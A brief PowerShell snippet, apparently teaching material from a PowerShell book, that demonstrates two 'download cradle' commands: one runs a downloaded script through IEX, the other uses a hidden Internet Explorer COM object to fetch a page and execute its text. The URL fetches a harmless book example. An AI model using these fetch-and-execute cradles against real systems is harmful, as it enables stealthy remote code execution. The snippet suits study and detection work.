# typical download cradle
IEX (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/ddneves/Book_Learn_PowerShell/master/Ch1/RetrieveVersion.ps1")

# Starting an IE COMObject hidden - downloading and executing the content
$ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate("https://raw.githubusercontent.com/ddneves/Book_Learn_PowerShell/master/Ch1/RetrieveVersion.ps1");start-sleep -s 3;$r=$ie.Document.body.innerText;$ie.quit();IEX $r
